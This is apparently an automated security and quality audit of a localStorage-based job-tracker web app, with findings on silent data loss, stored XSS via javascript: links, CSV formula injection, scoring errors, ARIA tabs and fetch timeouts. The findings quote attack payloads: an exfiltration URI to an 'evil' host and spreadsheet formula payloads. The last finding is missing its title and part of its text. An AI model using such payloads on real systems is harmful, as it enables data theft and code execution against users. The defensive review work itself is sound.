## High

### 🔴 [HIGH] importJobsFromJson silently replaces ALL jobs with no confirmation

- **Area:** data-integrity · **Location:** `app.js:1396-1409 (the unconditional overwrite is line 1400; both callers at 1381-1394)`
- **Issue:** Importing JSON unconditionally overwrites the entire job list (jobs = parsed.map(normalizeJob)) with zero confirmation dialog and no merge option. Both import entry points reach this: the file picker (importJsonFile, line 1381-1390) and the paste box (importJsonText, line 1392-1394). The toast even reports success: `Imported ${jobs.length} jobs.`. By contrast, the far-less-destructive 'Restore Samples' action (restoreSamples, line 1309-1316) and single-job delete (deleteCurrentJob, line 1282) BOTH prompt with window.confirm. So the most data-destroying operation in the app is the only one without a guard. Real loss scenario: a user with 40 manually-tracked, scored, annotated roles imports a small JSON file (e.g. a 3-job export from another device, or a partial/old backup) intending to add to their list. All 40 existing roles, including notes and statuses, are instantly and permanently destroyed and written to localStorage (saveJobs at line 1402), overwriting the only copy. There is no undo.
- **Fix:** Add a confirmation before replacing when the list is non-empty. In importJobsFromJson, after the Array.isArray check and before `jobs = parsed.map(normalizeJob)`, insert: `if (jobs.length && !window.confirm(`Replace your current ${jobs.length} jobs with ${parsed.length} imported jobs? This cannot be undone.`)) return;`. Stronger options, in order of preference: (1) offer a merge mode that appends new entries and dedupes by applyUrl (reuse the `job.applyUrl === found.url` check from saveDiscoveredJob at line 983) and/or by id (normalizeJob already mints ids), instead of wiping; (2) before overwriting, snapshot the existing array to a backup key, e.g. localStorage.setItem(STORAGE_KEY + '.bak', JSON.stringify(jobs)), and expose a restore action. At minimum the confirm gate (matching the existing pattern at lines 1282 and 1310) is required so the most destructive action is not the only unguarded one.

### 🔴 [HIGH] saveJobs has no try/catch: QuotaExceededError silently loses every write

- **Area:** data-integrity · **Location:** `app.js:508-510`
- **Issue:** saveJobs is the single persistence chokepoint (called by saveJobFromForm, deleteCurrentJob, saveDiscoveredJob, restoreSamples, loadJobs, importJobsFromJson) and its localStorage.setItem call is not wrapped in try/catch. localStorage.setItem can throw: QuotaExceededError when the ~5MB origin quota is hit (the app stores pretty-printed JSON via JSON.stringify(nextJobs, null, 2), inflating size, and Auto Finder can append many roles with long descriptions), and a SecurityError/DOMException in Safari Private Mode where the quota is effectively 0. When it throws, the in-memory mutation has ALREADY happened (e.g. saveJobFromForm line 1270 sets `jobs = ...` before calling saveJobs at line 1271), so the UI/state diverges from disk with no error surfaced to the user. The throw also aborts the rest of the handler: in saveJobFromForm, closeJobDialog() and renderAll() (lines 1272-1273) never run, so the dialog stays open and the user assumes the save failed and may retry or re-enter data, while in fact the previous on-disk state is now stale. After a reload, every unsaved change since the last successful write is gone with no warning.
- **Fix:** Wrap setItem in try/catch and return a success boolean.

## Medium

### 🟠 [MEDIUM] javascript: URI in apply/posting links enables stored XSS via imported JSON

- **Area:** security · **Location:** `app.js:624 (escape helper at app.js:1510-1512; identical second sink at app.js:943)`
- **Issue:** The tracker job card renders the apply URL into an href with escapeAttribute() but never validates the URL scheme. escapeAttribute (lines 1510-1512) only escapes & < > " ' and backtick — it does NOT touch the colon or the letters in 'javascript', so a value like `javascript:fetch('//evil/?c='+localStorage[STORAGE_KEY])` survives intact and becomes a live click-to-execute link. The normal form input at #urlInput has type="url" (index.html:341) which gives weak browser validation, but importJobsFromJson (line 1396) and the localStorage path (loadJobs, line 463) feed straight into normalizeJob, which copies applyUrl verbatim (line 488) with NO scheme check. An attacker who gets a victim to paste/import a crafted JSON array, or who can write the victim's localStorage, plants a job whose 'Open URL' button executes arbitrary JS in the page origin on click — exfiltrating all stored job data or pivoting further.
- **Fix:** Add a scheme-allowlist helper and gate every URL that reaches an href. e.g. `function safeUrl(u){ try { const p = new URL(String(u ?? ""), location.href); return (p.protocol === "http:" || p.protocol === "https:") ? p.href : ""; } catch { return ""; } }`. At app.js:624, compute `const href = safeUrl(job.applyUrl);` and render the button only when href is non-empty (`const urlButton = href ? \`<a ... href="${escapeAttribute(href)}" ...>Open URL</a>\` : "";`). Apply the same helper at app.js:943 for job.url. Optionally also sanitize in normalizeJob (app.js:488) so a bad scheme is dropped at the data boundary as defense in depth. Note source.buildUrl outputs at app.js:972 are app-controlled constants, so they are lower priority but can use the same helper for consistency.

### 🟠 [MEDIUM] Unvalidated job.url scheme in Auto Finder 'Open Posting' link (third-party API data into href)

- **Area:** security · **Location:** `app.js:943 (render sink for Auto Finder; identical sibling sink at app.js:624 for the tracker; tainted source at app.js:747, 774, 802; persistence at app.js:995/488)`
- **Issue:** renderFinderResults() builds the 'Open Posting' anchor from job.url, which comes directly from the Remotive / Arbeitnow / RemoteOK API responses (lines 747, 774, 802) with no scheme validation — only escapeAttribute is applied. These are third-party feeds; if any one of them is compromised, MITM'd, or simply allows attacker-controlled job postings, a job whose url field is `javascript:...` becomes a code-executing link. The same unvalidated url is also persisted via saveDiscoveredJob (line 995 sets applyUrl: found.url), so a malicious posting saved to the tracker becomes a permanent stored-XSS vector re-rendered on every load (see the line 624 finding).
- **Fix:** Add a scheme allowlist helper and apply it at BOTH normalize/store time and render time (defense in depth), since the same value flows into two hrefs and into localStorage. Helper (place near escapeHtml): function safeUrl(value) { const raw = String(value ?? "").trim(); if (!raw) return ""; try { const u = new URL(raw, window.location.href); return (u.protocol === "https:" || u.protocol === "http:") ? u.href : ""; } catch { return ""; } } Apply it: - At normalize time so nothing dangerous is ever persisted: app.js:488 → `applyUrl: safeUrl(job.applyUrl || job.url)`. (This also automatically sanitizes the saveDiscoveredJob path at app.js:995, since that value passes through normalizeJob.) - Optionally also sanitize at the fetch/normalize boundary (app.js:747, 774, 802) e.g. `url: safeUrl(job.url)` for clarity. - At render time as a backstop: app.js:943 → `href="${escapeAttribute(safeUrl(job.url))}"`, and app.js:624 → `href="${escapeAttribute(safeUrl(job.applyUrl))}"`. When safeUrl returns "" you may also drop/disable the anchor rather than render an empty href. Keep escapeAttribute as-is for attribute-context escaping; safeUrl handles the scheme, escapeAttribute handles the quoting — both are needed.

### 🟠 [MEDIUM] CSV export lacks formula-injection neutralization (Excel/Sheets formula execution)

- **Area:** security · **Location:** `app.js:1484-1487 (csvCell); reached via exportCsv at app.js:1350-1374`
- **Issue:** csvCell() only wraps each value in double quotes and doubles embedded quotes (RFC 4180 escaping). It does NOT neutralize leading =, +, -, or @, which spreadsheet apps interpret as formulas when the file is opened. Any free-text field — title, company, location, or the notes (fit/learn/keywords/questions/redFlags) — can contain such a payload. Because Auto Finder pulls titles/descriptions from third-party APIs and saveDiscoveredJob persists them (lines 990-1012), and imported JSON is unvalidated, an attacker-controlled value like `=HYPERLINK("http://evil","click")` or `=cmd|'/c calc'!A1` lands in the CSV and executes/auto-loads when the victim opens the exported file in Excel/LibreOffice/Sheets. Note RFC quoting alone does not stop this — a quoted cell starting with = is still parsed as a formula by Excel.
- **Fix:** Neutralize formula-triggering leading characters inside csvCell before RFC quoting. Replace the body with:\n\nfunction csvCell(value) {\n let text = String(value ?? "");\n if (/^[=+\\-@\\t\\r]/.test(text)) text = "'" + text;\n return `"${text.replace(/"/g, '""')}"`;\n}\n\nThis prepends a single apostrophe to any cell starting with =, +, -, @, tab, or CR so spreadsheet apps treat it as literal text, while keeping the value human-readable. Defense-in-depth: also validate/sanitize string fields in normalizeJob on import so untrusted JSON cannot inject payloads into the tracker.

### 🟠 [MEDIUM] Imported / localStorage JSON bypasses all input validation and is trusted by normalizeJob

- **Area:** security · **Location:** `app.js:488 (normalizeJob copies applyUrl verbatim); untrusted entry points at app.js:1400 (importJobsFromJson) and app.js:466 (loadJobs); exploitable href sink at app.js:624; CSV sink at app.js:1354`
- **Issue:** importJobsFromJson() (and loadJobs at line 463) JSON.parse untrusted input and map every element through normalizeJob without any field-level sanitization of string content. normalizeJob (lines 480-506) copies title/company/location/applyUrl/payRange/commuteEstimate/notes.* verbatim. This is the trust-boundary root cause feeding the href findings above and the CSV finding: import is the single entry point an attacker uses to plant a javascript: URL or a CSV formula payload without going through the type=url form field. The only validation is array-ness (line 1399) and numeric clamping of scores (line 495). Rendering is mostly escaped via escapeHtml so textual XSS in title/notes is blocked, but applyUrl into href is the exploitable gap.
- **Fix:** Validate applyUrl through an http(s)-only allowlist inside normalizeJob so every path (import, localStorage, form, finder) is covered in one place. Example: `const safeUrl = (() => { try { const u = new URL(job.applyUrl || job.url || ""); return (u.protocol === "http:" || u.protocol === "https:") ? u.href : ""; } catch { return ""; } })();` and assign that to applyUrl. Additionally constrain enum fields (employmentType, schedule, lane, status) to their known option lists rather than copying arbitrary strings. For the CSV export at line 1354, prefix any cell value beginning with = + - @ (tab/CR) with a leading apostrophe to neutralize formula injection. The href at line 624 is then safe because applyUrl can only ever be http(s) or empty; escapeAttribute remains correct for attribute-context escaping.

### 🟠 [MEDIUM] Decision threshold 75 ("Strong") is nearly unreachable for typical scores; README contradicts true score range

- **Area:** correctness · **Location:** `app.js:1170-1171 (getDecisionLabel threshold), 1166-1168 (calculateScore), 39-46 (SCORE_FIELDS weights), 438 (slider min=0 max=10); README.md:13-17`
- **Issue:** calculateScore sums weighted 0-10 sliders. Positive weights total 8.0 (cash 1.0 + schedule 1.5 + tech 2.0 + people 1.5 + exit 2.0), stress is -1.5. The TRUE achievable range is therefore -15 (all positives=0, stress=10) to +80 (all positives=10, stress=0), not 0-100. The decision label getDecisionLabel returns "Strong bridge role" only at score>=75. To hit 75 with a normal stress_cost of ~4-5 you need almost every positive factor pinned at 9-10: e.g. with stress=5 you must reach 75+7.5=82.5 of the 80 positive max, which is impossible. None of the seven STARTER_JOBS reaches 75 (the best, Business Systems Analyst, scores 8*1.0 + 6*1.5 + 8*2.0 + 8*1.5 + 9*2.0 - 5*1.5 = 8+9+16+12+18-7.5 = 55.5). So the entire 'Strong bridge role' tier is effectively dead. The README (lines 13-17) presents 75+/55-74/35-54/<35 as if the scale tops out near 100, which is false; max is 80 and the top band is a sliver.
- **Fix:** Pick one intended scale and make weights, the slider max, thresholds, and README agree. Cleanest option: normalize calculateScore to 0-100 before labeling, e.g. map the raw sum (range -15..80, span 95) onto 0-100: normalized = ((raw + 15) / 95) * 100, then keep the 75/55/35 thresholds (which would then be genuinely reachable). Simpler alternative: leave calculateScore as a raw weighted sum but lower getDecisionLabel thresholds to fit the real 80 positive max with realistic stress, e.g. Strong >= 60, Worth applying >= 45, Maybe >= 30. Either way, update README.md:13-17 to describe the actual scale and bands so the documented boundaries match the code. Do NOT frame the README fix as correcting a stated "~100 maximum" — the README never claims one; just align whichever thresholds you choose.

### 🟠 [MEDIUM] isOutsideTargetRegion flags any Canada/Canadian-mentioning remote US role as outside-region, applying a -200 penalty that hides it entirely

- **Area:** correctness · **Location:** `app.js:1079-1088 (isOutsideTargetRegion, bare 'canada' at line 1085; explicitlyCompatible at 1084), with compounding effect at app.js:1098 and 1100 (isLocationCompatible regionNegative); suppression applied at app.js:832 (-200) and app.js:903 (filter)`
- **Issue:** isOutsideTargetRegion returns true when target wants US/Bay-Area, the job text matches outsideRegion (which includes bare 'canada'), and the location is not explicitlyCompatible. The outsideRegion regex /(...|canada only|canada)/ matches the substring 'canada' anywhere in title+company+location+description. A very common US-remote posting saying 'open to candidates in the US and Canada' or 'North America (US/Canada)' will match 'canada'. If its location field doesn't independently contain a US/remote token, explicitlyCompatible is false and the job is marked outsideTargetRegion. In enrichDiscoveredJob (line 832) that subtracts 200 from matchScore AND renderFinderResults (line 903) filters out every outsideTargetRegion job before scoring, so legitimate US+Canada remote roles are silently dropped. Note isLocationCompatible's regionNegative (line 1098) ALSO lists 'canada' with the same effect, compounding the suppression. The phrase 'americas'/'north america' is treated as positive elsewhere (line 1084 explicitlyCompatible, line 1102) yet 'canada' alone is negative — a contradiction for North-America-wide roles.
- **Fix:** In isOutsideTargetRegion (line 1085) and isLocationCompatible.regionNegative (line 1098), drop the bare `canada` alternative and keep only the explicit `canada only`. Because the substring-match scope is title+company+location+description, also add a positive guard before applying the negative so North-America-wide phrasing wins: e.g. skip the outside-region verdict when the text matches /(us and canada|u\.s\. and canada|usa and canada|north america|americas|us\/canada)/. Equivalently, test the region-negative against the LOCATION field only (as explicitlyCompatible already does) rather than the full description, so a US-remote posting that merely *welcomes* Canadians by name in its description is not penalized. Apply the same change in both functions so the matchScore -200 (line 832) / pre-score filter (line 903) and the locationMatch=false path (line 1100) are both corrected.

### 🟠 [MEDIUM] loadJobs wipes a malformed-but-array store to starter jobs (destroys recoverable data)

- **Area:** data-integrity · **Location:** `app.js:466-473 (the destructive overwrite), root cause at app.js:480-481 (normalizeJob dereferences job.scores/job.notes without a guard)`
- **Issue:** On startup loadJobs parses stored JSON and runs parsed.map(normalizeJob). normalizeJob (line 480-482) immediately does `const scores = job.scores` and `const notes = job.notes`, which throws a TypeError if any array element is null or a primitive (e.g. stored data is `[null, {...}]` or `["x"]`). Such data is still valid JSON and passes the `Array.isArray(parsed)` check at line 465, so it reaches the map and throws. The catch block then calls `saveJobs(seeded)` (line 469), which OVERWRITES the existing stored data with starter jobs. So partially-corrupted but partially-recoverable user data is silently destroyed on the next page load instead of being left intact for manual recovery. The user only sees 'Saved data was unreadable. Starter jobs were restored.' and their real entries are gone from localStorage. A single bad element nukes the whole store.
- **Fix:** Two parts. (1) Harden normalizeJob: add `if (!job || typeof job !== "object") return null;` (or coerce: `if (!job || typeof job !== "object") job = {};`) as the first line of normalizeJob (app.js:480) so a null/undefined/primitive element can never throw. If returning null, follow the map with a `.filter(Boolean)` at line 466 so individual bad rows are dropped instead of nuking the whole array. (2) Make the catch non-destructive: before any seeding, copy the unreadable raw payload to a backup key, e.g. `localStorage.setItem(STORAGE_KEY + ".corrupt." + Date.now(), saved);` then seed only in memory (`return seeded;`) WITHOUT calling saveJobs, so the next save (driven by an explicit user action) is what persists, and the original bytes remain recoverable. Do not call saveJobs(seeded) inside the catch (remove line 470). With part (1) applied, the catch will rarely even be reached for array-shaped data, but the backup-before-overwrite guard protects against the genuinely-unparseable (non-JSON) case too.

### 🟠 [MEDIUM] Tab navigation is not an ARIA tabs widget and has no keyboard arrow support

- **Area:** accessibility · **Location:** `index.html:25-31 (nav + tab buttons), index.html:34,110,177,256,265 (tab panels); state logic at app.js:1423-1427 (switchTab) and app.js:387-389 (bindEvents)`
- **Issue:** The primary navigation is built from plain buttons inside a <nav>. There is no role="tablist" on the container, no role="tab" / aria-selected on the buttons, no role="tabpanel" / tabindex on the panels, and no roving-tabindex or arrow-key handling. Screen reader users are never told these are tabs or which one is selected (the active state is conveyed only by a CSS class + color, see app.js switchTab). Keyboard users cannot move between tabs with Left/Right/Home/End as the WAI-ARIA Tabs pattern requires; only Tab key sequential focus works. This violates WCAG 4.1.2 Name, Role, Value (role/state not exposed) and the expected Authoring Practices keyboard interaction.
- **Fix:** 1) Markup: add role="tablist" to the <nav> (or an inner div). On each button add id="<name>-tab", role="tab", aria-controls="<name>" (matching the panel id), aria-selected ("true" on dashboard, "false" elsewhere), and a roving tabindex (0 on the selected tab, -1 on the rest). On each <section class="tab-panel"> add role="tabpanel", tabindex="0", and aria-labelledby="<name>-tab". Note this also fixes the existing dangling aria-labelledby="dashboard-tab" on index.html:34, which currently points to a non-existent id. 2) switchTab (app.js:1423): after toggling classes, also set button.setAttribute("aria-selected", isActive ? "true" : "false") and button.tabIndex = isActive ? 0 : -1 for each tab-button. 3) Keyboard: in bindEvents (app.js:387) add a keydown handler on the tablist (or each button) for ArrowRight/ArrowLeft (wrap-around), Home, End to move roving focus and activate the focused tab, calling switchTab and button.focus(). This satisfies WCAG 4.1.2 and the WAI-ARIA Tabs authoring pattern.

### 🟠 [MEDIUM] Eight network fetches per Auto Finder run with no timeout, no abort, and no caching

- **Area:** perf-maintainability · **Location:** `app.js:681-735 (runAutoFinder; parallel Remotive fan-out at 697, button re-enable only at 733), fetch helpers with no timeout/signal at 738 (fetchRemotive), 757 (fetchArbeitnow), 784 (fetchRemoteOk); clearFinderResults cannot abort at 1020-1025; default 'bridge' pack of 8 queries at 115-124`
- **Issue:** runAutoFinder fires N parallel Remotive fetches (one per query — the 'bridge' pack has 8 queries, line 114-124) via Promise.allSettled, then sequentially awaits Arbeitnow and RemoteOK. None of the three fetch helpers (fetchRemotive line 738, fetchArbeitnow line 757, fetchRemoteOk line 784) pass a signal or any timeout, so a hung endpoint leaves the button stuck on 'Finding...' indefinitely with no way to cancel — the Clear Results button (clearFinderResults, line 1020) does not abort in-flight requests. There is also no caching/debounce: clicking Find Jobs twice re-issues all ~10 requests, and the Remotive endpoint is hit once per query rather than batched. The button is disabled during a run (line 687) so double-submit is partly mitigated, but a stuck fetch never re-enables it because button.disabled=false only runs after all awaits resolve (line 733).
- **Fix:** 1) Give every fetch a timeout/abort. Either pass `{ signal: AbortSignal.timeout(10000) }` to each fetch in fetchRemotive/fetchArbeitnow/fetchRemoteOk (app.js:738/757/784), or share one AbortController per run. 2) Wrap the entire runAutoFinder body in try/finally so `button.disabled = false; button.textContent = "Find Jobs"` always runs even on timeout/abort/throw (move the app.js:733-734 lines into a finally). 3) Store the run's AbortController in a module-scoped variable and call controller.abort() inside clearFinderResults (app.js:1020) so Clear Results cancels an in-flight run. 4) Optional: short-TTL cache keyed by pack+location to avoid re-issuing identical searches on repeated Find Jobs clicks; the Remotive per-query fan-out is acceptable since the API takes a single `search` param, but consider deduping identical/overlapping query terms before fanning out.

- **Area:** perf-maintainability · **Location:** `app.js:832 (matchScore -200 weight), 840-848 (inferLane), 1042-1052 (isTargetBridgeRole; badTitle 1047), 1054-1064 (scoreDiscoveryRelevance; weights 1056/1058/1061/1062), 1075-1077 (isBadFinderFit), 1079-1088 (isOutsideTargetRegion; region list 1085), 1090-1106 (isLocationCompatible; regionNegative 1098)`
- **Issue:** The role/lane/region classification logic is spread across six functions (inferLane, isTargetBridgeRole, scoreDiscoveryRelevance, isBadFinderFit, isOutsideTargetRegion, isLocationCompatible) with heavily overlapping, partially inconsistent inline regex literals. Reconcile the union of members deliberately (decide once whether physician/nurse, account payable, product manager, social media belong in the negative set) rather than leaving three divergent copies. 2. Have isBadFinderFit, scoreDiscoveryRelevance's negative branch, and isTargetBridgeRole's badTitle all reference NEGATIVE_FIT_TERMS; have isOutsideTargetRegion, isLocationCompatible.regionNegative, and scoreDiscoveryRelevance's region branch all reference REGION_NEGATIVE_TERMS; have the US/Bay-Area positive checks reference US_POSITIVE_TERMS. 3. Promote the weights into a named object: const SCORING = { OUTSIDE_REGION_PENALTY: 200, DIRECT_MATCH: 80, LOCATION_MATCH: 24, ROLE_KEYWORD: 28, FLEX_SCHEDULE: 10, BODY_KEYWORD: 16, NEGATIVE_FIT: 70, REGION_PENALTY: 45 }; and reference SCORING.* at line 832 and inside scoreDiscoveryRelevance. This eliminates the silent drift, compiles each regex once, and makes the now-truly-pure classifiers unit-testable.
